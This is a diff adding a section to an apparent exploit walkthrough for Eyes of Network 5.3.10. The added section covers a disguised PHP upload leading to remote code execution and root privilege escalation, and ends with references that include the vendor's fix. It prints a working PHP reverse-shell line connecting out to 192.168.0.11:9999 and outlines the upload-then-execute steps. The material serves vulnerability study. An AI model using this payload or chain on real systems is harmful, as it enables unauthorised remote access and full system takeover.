@@ -32,3 +32,48 @@ Next using a proxy interrupter, they interrupt the POST request to change the pa
 ![image](https://user-images.githubusercontent.com/71412992/112727172-8424c280-8ef7-11eb-8abf-9956d3f645e6.png)
 
 Using the Admin session ID, user_name,user_id, group_id the user is able to change the password of the admin immediately and now has access to that account through regular log in. 
+
+## Root Access to Eyes of Network OS (CentOS)
+The last vulnerability that we explored with this exploit was gaining root access on the Eyes of Network operating system. This vulnerability could result in massive loss of data and destruction.  The following code will POST a .php file disguised as a .XML file to a directory on system. A GET request is then called on that file which will cause it to execute: 
+
+```python
+postreq=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data, verify=False)
+rep2=postreq
+
+...
+
+requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies, verify=False)
+
+```
+The php file will give a specified IP and Port interactive rights to the OS: 
+
+```
+<?php exec("/bin/bash -c 'bash -i > /dev/tcp/192.168.0.11/9999 0>&1'");
+```
+Here we can see that the file has been successfully uploaded 
+
+![image](https://user-images.githubusercontent.com/71412992/112731199-3fefed00-8f0c-11eb-8485-9e4b1914000c.png)
+
+During the time the code is running you will listen on the port specified in the code (on the machine that with the specified IP). Once the GET request is run you will be logged in as a user. 
+Moving to the /tmp directory you are then able to do a os.execute in order to escape interpreters and gain root access. This can all be seen here: 
+![image](https://user-images.githubusercontent.com/71412992/112731497-f7393380-8f0d-11eb-932d-c97a413d1e6a.png)
+
+It should be noted that the ITSM module needs to be installed on Eyes of Network for this portion of the explot to work as this is what allows XML upload. 
+
+
+## References 
+
+[1] Eyes of Network website https://www.eyesofnetwork.com/en
+
+[2] Exploit Guide and walkthrough  https://ariane.agency/site/index.php/2021/02/23/quand-tu-trouves-une-0day-pendant-un-audit-d/
+
+[3] Explot repository https://github.com/ArianeBlow/exploit-eyesofnetwork5.3.10/blob/main/PoC-BruteForceID-arbitraty-file-upload-RCE-PrivEsc.py
+
+[4] Eyes of Network Community Discussion https://github.com/EyesOfNetworkCommunity/eonweb/issues/87
+
+[5] Eyes of Network Eonweb repository for ITSM https://github.com/EyesOfNetworkCommunity/eonweb
+
+[6] Linux preivileges https://guif.re/linuxeop
+
+[7] Exploit Fix https://github.com/EyesOfNetworkCommunity/eonweb/commit/6d1be13ba36fedfc8cdcbe9c30e99d4e0ca7db1b?fbclid=IwAR0X3qOSDuq1Ke_uAHDjKriPMAfSDWhi4IU6QZWKTuo-Zj4R1sV_TG7hPTo#
+
